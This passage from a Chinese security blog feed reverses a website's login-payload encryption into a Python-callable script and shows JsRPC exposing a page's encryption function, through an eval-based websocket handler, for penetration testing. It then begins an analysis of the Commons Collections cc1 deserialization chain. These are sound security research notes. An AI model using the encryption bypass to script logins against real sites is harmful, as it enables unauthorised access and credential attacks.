class="string">&quot;%&quot;</span> + t[i].<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(o)</span><br><span class="line">    &#125;(t)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;kVmcv52ZJtlI6ICZJV2YhJHdiwiIv+K6ZSZ6BC65G+a5Wio53+Y56yp5Lmo5iojInNXTlNnbvB3clJnIsIyMxATMyIiOiUGZvNUZz52bwNXZyJye9xGb15mOic2cNJ3byJXZiwCbsVnb6ISY0FGZiwiI5EDMlRDO1cjMwMjN4AjYiBDZkRjM5UWM0YjNlNWNjNjI6ICZJR3clVXclJnIsISXlNWYyRFI&quot;</span></span><br><span class="line"><span class="keyword">var</span> o = <span class="title function_">u</span>(a)</span><br><span class="line">o = <span class="title function_">decrypt</span>(o.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o)</span><br></pre></td></tr></table></figure>

<p>执行得到结果</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;responseCode&quot;</span>:<span class="string">&quot;21013&quot;</span>,<span class="string">&quot;responseMsg&quot;</span>:<span class="string">&quot;手机号或密码错误&quot;</span>,<span class="string">&quot;traceId&quot;</span>:<span class="string">&quot;[Ignored Trace]&quot;</span>,<span class="string">&quot;requestId&quot;</span>:<span class="string">&quot;3c5ce6641e924dd0bb0863027584e019&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;errorMsg&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure>

<h1 id="3-成品"><a href="#3-成品" class="headerlink" title="3.成品"></a>3.成品</h1><p>把加解密合并一下,再稍微修改一下,方便python调用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encrypt</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="string">&quot;&quot;</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , a = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , n = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , l = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , b = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , s = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (e = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="built_in">encodeURIComponent</span>(e), o = [], i = <span class="number">0</span>; i &lt; t.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = t.<span class="title function_">charAt</span>(i);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;%&quot;</span> === r) &#123;</span><br><span class="line">                <span class="keyword">var</span> a = t.<span class="title function_">charAt</span>(i + <span class="number">1</span>) + t.<span class="title function_">charAt</span>(i + <span class="number">2</span>)</span><br><span class="line">                  , n = <span class="built_in">parseInt</span>(a, <span class="number">16</span>);</span><br><span class="line">                o.<span class="title function_">push</span>(n),</span><br><span class="line">                i += <span class="number">2</span></span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                o.<span class="title function_">push</span>(r.<span class="title function_">charCodeAt</span>(<span class="number">0</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> o.<span class="title function_">map</span>((<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(e)</span><br><span class="line">        &#125;</span><br><span class="line">        )).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#125;(e); c &lt; e.<span class="property">length</span>; )</span><br><span class="line">        o = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        i = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        a = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        n = o &gt;&gt; <span class="number">2</span>,</span><br><span class="line">        l = (<span class="number">3</span> &amp; o) &lt;&lt; <span class="number">4</span> | i &gt;&gt; <span class="number">4</span>,</span><br><span class="line">        b = (<span class="number">15</span> &amp; i) &lt;&lt; <span class="number">2</span> | a &gt;&gt; <span class="number">6</span>,</span><br><span class="line">        s = <span class="number">63</span> &amp; a,</span><br><span class="line">        <span class="built_in">isNaN</span>(i) ? b = s = <span class="number">64</span> : <span class="built_in">isNaN</span>(a) &amp;&amp; (s = <span class="number">64</span>),</span><br><span class="line">        t = t + r.<span class="title function_">charAt</span>(n) + r.<span class="title function_">charAt</span>(l) + r.<span class="title function_">charAt</span>(b) + r.<span class="title function_">charAt</span>(s);</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="string">&quot;&quot;</span></span><br><span class="line">      , r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> e.<span class="property">length</span> % <span class="number">2</span> ? (r = (e.<span class="property">length</span> + <span class="number">1</span>) / <span class="number">2</span>,</span><br><span class="line">    t = e.<span class="title function_">substring</span>(<span class="number">1</span>, r),</span><br><span class="line">    o = e.<span class="title function_">substring</span>(r),</span><br><span class="line">    i = e.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">1</span>) + o + t) : (r = e.<span class="property">length</span> / <span class="number">2</span>,</span><br><span class="line">    t = e.<span class="title function_">substring</span>(<span class="number">0</span>, r),</span><br><span class="line">    i = (o = e.<span class="title function_">substring</span>(r)) + t),</span><br><span class="line">    i</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decrypt</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="string">&quot;&quot;</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , a = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , n = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , l = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , b = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , s = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (e = e.<span class="title function_">replace</span>(<span class="regexp">/[^A-Za-z0-9+/=]/g</span>, <span class="string">&quot;&quot;</span>); c &lt; e.<span class="property">length</span>; )</span><br><span class="line">        n = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        l = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        b = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        s = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        o = n &lt;&lt; <span class="number">2</span> | l &gt;&gt; <span class="number">4</span>,</span><br><span class="line">        i = (<span class="number">15</span> &amp; l) &lt;&lt; <span class="number">4</span> | b &gt;&gt; <span class="number">2</span>,</span><br><span class="line">        a = (<span class="number">3</span> &amp; b) &lt;&lt; <span class="number">6</span> | s,</span><br><span class="line">        t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(o),</span><br><span class="line">        <span class="number">64</span> != b &amp;&amp; (t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i)),</span><br><span class="line">        <span class="number">64</span> != s &amp;&amp; (t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(a));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">map</span>((<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        )), o = <span class="string">&quot;&quot;</span>, i = <span class="number">0</span>; i &lt; t.<span class="property">length</span>; i++)</span><br><span class="line">            o += <span class="string">&quot;%&quot;</span> + t[i].<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(o)</span><br><span class="line">    &#125;(t)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pyencrypt</span>(<span class="params">mobile,password</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="string">&#x27;&#123;&quot;mobile&quot;:&quot;&#x27;</span>+mobile+<span class="string">&#x27;&quot;,&quot;password&quot;:&quot;&#x27;</span>+password+<span class="string">&#x27;&quot;,&quot;zoneCode&quot;:&quot;86&quot;,&quot;captchaId&quot;:&quot;&quot;,&quot;verificationCode&quot;:&quot;&quot;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">u</span>(t = <span class="title function_">encrypt</span>(e).<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pydecrypt</span>(<span class="params">a</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">decrypt</span>(<span class="title function_">u</span>(a).<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">mobile,password</span>):</span><br><span class="line">    path = <span class="string">r&#x27;test.js&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        JsData = f.read()</span><br><span class="line">    encrypt = execjs.<span class="built_in">compile</span>(JsData).call(<span class="string">&#x27;pyencrypt&#x27;</span>,mobile,password)</span><br><span class="line">    <span class="keyword">return</span> encrypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">string</span>):</span><br><span class="line">    path = <span class="string">r&#x27;test.js&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        JsData = f.read()</span><br><span class="line">    decrypt = execjs.<span class="built_in">compile</span>(JsData).call(<span class="string">&#x27;pydecrypt&#x27;</span>,string)</span><br><span class="line">    <span class="keyword">return</span> decrypt</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>加密</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>JsRPC-Js远程调用</title>
    <url>//blogs/Js_RPC/</url>
    <content><![CDATA[<h3 id="JsRPC简介"><a href="#JsRPC简介" class="headerlink" title="JsRPC简介"></a>JsRPC简介</h3><p>在很多渗透场景中，会存在请求数据包加密的情况，传统方法就是找到加密函数，但是需要扣代码，补环境，遇到复杂的情景需要耗费很多时间。JsRPC直接在浏览器开启一个ws和服务连接，以请求http接口的形式来和浏览器通信，浏览器收到调用请求执行原先设置好的js代码并获得返回值。</p>
<p>项目地址：</p>
<p><a href="https://github.com/jxhczhl/JsRpc">https://github.com/jxhczhl/JsRpc</a></p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>打开目标网站，发送请求，观察请求包</p>
<p><img src="/../images/JsRpc-Js%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8/image-20230422214713554.png" alt="image-20230422214713554"></p>
<p>这里password参数是加密的，全局搜索这个参数</p>
<p><img src="/../images/JsRpc-Js%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8/image-20230422220827522.png" alt="image-20230422220827522"></p>
<p>找到一处可能是加密前的password，下断点，跟一下，看能不能跟到加密函数</p>
<p>跟到这里之后，再出去password就加密了，所以n.encryptLong()里面即为加密逻辑</p>
<p><img src="/../images/JsRpc-Js%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8/image-20230422221737687.png" alt="image-20230422221737687"></p>
<p>因为有JsRpc，所以不用跟进去了，直接将这里定义出来</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">n</span> = n</span><br></pre></td></tr></table></figure>

<p>这样就可以通过n调用加密逻辑了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">n.<span class="title function_">encryptLong</span>(<span class="string">&#x27;123456&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/JsRpc-Js%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8/image-20230422222851731.png" alt="image-20230422222851731"></p>
<p>打开工具，默认监听12080端口</p>
<p><img src="/../images/JsRpc-Js%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8/image-20230422214422481.png" alt="image-20230422214422481"></p>
<p>将项目中的JsEnv.js代码复制到控制台中</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Hlclient</span>(<span class="params">wsURL</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">wsURL</span> = wsURL;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handlers</span> = &#123;&#125;;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">socket</span> = &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (!wsURL) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;wsURL can not be empty!!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">connect</span>()</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handlers</span>[<span class="string">&quot;_execjs&quot;</span>]=<span class="keyword">function</span> (<span class="params">resolve,param</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> res=<span class="built_in">eval</span>(param)</span><br><span class="line">        <span class="keyword">if</span> (!res)&#123;</span><br><span class="line">            <span class="title function_">resolve</span>(<span class="string">&quot;没有返回值&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_">resolve</span>(res)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Hlclient</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">connect</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;begin of connect to wsURL: &#x27;</span> + <span class="variable language_">this</span>.<span class="property">wsURL</span>);</span><br><span class="line">    <span class="keyword">var</span> _this = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">socket</span>[<span class="string">&quot;ySocket&quot;</span>] = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="variable language_">this</span>.<span class="property">wsURL</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">socket</span>[<span class="string">&quot;ySocket&quot;</span>].<span class="property">onmessage</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">let</span> blob=e.<span class="property">data</span></span><br><span class="line">                blob.<span class="title function_">text</span>().<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span>&#123;</span><br><span class="line">                    _this.<span class="title function_">handlerRequest</span>(data);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;<span class="keyword">catch</span>&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;not blob&quot;</span>)</span><br><span class="line">                _this.<span class="title function_">handlerRequest</span>(blob)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;connection failed,reconnect after 10s&quot;</span>);</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            _this.<span class="title function_">connect</span>()</span><br><span class="line">        &#125;, <span class="number">10000</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">socket</span>[<span class="string">&quot;ySocket&quot;</span>].<span class="property">onclose</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;connection failed,reconnect after 10s&quot;</span>);</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            _this.<span class="title function_">connect</span>()</span><br><span class="line">        &#125;, <span class="number">10000</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Hlclient</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">send</span> = <span class="keyword">function</span> (<span class="params">msg</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">socket</span>[<span class="string">&quot;ySocket&quot;</span>].<span class="title function_">send</span>(msg)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Hlclient</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">regAction</span> = <span class="keyword">function</span> (<span class="params">func_name, func</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> func_name !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;an func_name must be string&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> func !== <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;must be function&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;register func_name: &quot;</span> + func_name);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handlers</span>[func_name] = func;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//收到消息后这里处理，</span></span><br><span class="line"><span class="title class_">Hlclient</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">handlerRequest</span> = <span class="keyword">function</span> (<span class="params">requestJson</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _this = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="keyword">var</span> result=<span class="title class_">JSON</span>.<span class="title function_">parse</span>(requestJson);</span><br><span class="line">    <span class="comment">//console.log(result)</span></span><br><span class="line">    <span class="keyword">if</span> (!result[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">sendResult</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;need request param &#123;action&#125;&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> action=result[<span class="string">&quot;action&quot;</span>]</span><br><span class="line">    <span class="keyword">var</span> theHandler = <span class="variable language_">this</span>.<span class="property">handlers</span>[action];</span><br><span class="line">    <span class="keyword">if</span> (!theHandler)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">sendResult</span>(action,<span class="string">&#x27;action not found&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!result[<span class="string">&quot;param&quot;</span>])&#123;</span><br><span class="line">            <span class="title function_">theHandler</span>(<span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">                _this.<span class="title function_">sendResult</span>(action, response);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> param=result[<span class="string">&quot;param&quot;</span>]</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                param=<span class="title class_">JSON</span>.<span class="title function_">parse</span>(param)</span><br><span class="line">            &#125;<span class="keyword">catch</span> (e)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_">theHandler</span>(<span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">                _this.<span class="title function_">sendResult</span>(action, response);</span><br><span class="line">            &#125;,param)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error: &quot;</span> + e);</span><br><span class="line">        _this.<span class="title function_">sendResult</span>(action+e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Hlclient</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sendResult</span> = <span class="keyword">function</span> (<span class="params">action, e</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">send</span>(action + <span class="title function_">atob</span>(<span class="string">&quot;aGxeX14&quot;</span>) + e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注入环境后连接通信</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> demo = <span class="keyword">new</span> <span class="title class_">Hlclient</span>(<span class="string">&quot;ws://127.0.0.1:12080/ws?group=zzz&amp;name=hlg&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/../images/JsRpc-Js%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8/image-20230422223256859.png" alt="image-20230422223256859"></p>
<p>然后就可以调用js了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n.encryptLong(&quot;123456&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/execjs&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jscode&quot;</span>:jscode</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p>执行python脚本即可获得加密后的内容</p>
<p><img src="/../images/JsRpc-Js%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8/image-20230422223636413.png" alt="image-20230422223636413"></p>
<p>相比在控制台，这种方法返回的数据可以直接被python调用。</p>
]]></content>
      <tags>
        <tag>Js</tag>
        <tag>JsRpc</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全-cc1链分析</title>
    <url>//blogs/Java_cc1/</url>
    <content><![CDATA[<h3 id="Commons-Collections简介"><a href="#Commons-Collections简介" class="headerlink" title="Commons Collections简介"></a>Commons Collections简介</h3><p>Commons Collections是Apache软件基金会的一个开源项目。</p>
<p>Commons Collections增强了Java集合框架。 它提供了几个功能来简化收集处理。 它提供了许多新的接口，实现和实用程序。Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>jdk8u71之前的版本</p>
<p>CommonsCollections的版本选择3.1-3.2.1</p>
<p>添加Maven依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><p>正常使用Java，需要执行系统命令时，只需要调用Runtime类中的getRuntime()方法，然后调用该实例的exec()即可：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>但是只有实现了Serializable接口的类才能被序列化，所以通常会通过反射调用某个方法执行某个命令。反射允许对成员变量，成员方法和构造方法的信息进行编程访问。下面是一个反射的例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRunTimeMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime)getRunTimeMethod.invoke(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="cc1链分析"><a href="#cc1链分析" class="headerlink" title="cc1链分析"></a>cc1链分析</h3><h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><p>Transformer是Apache Commons Collections库中的一个接口，他只有一个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input object (leaving it unchanged) into some output object.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  the object to be transformed, should be left unchanged</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> a transformed object</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ClassCastException (runtime) if the input is the wrong class</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException (runtime) if the input is invalid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> FunctorException (runtime) if the transform cannot be completed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>transform就是此链的利用点</p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>寻找继承Transformer接口的类</p>
<p>有一个反射机制触发函数，在InvokerTransformer类中的transform(Object input)方法</p>
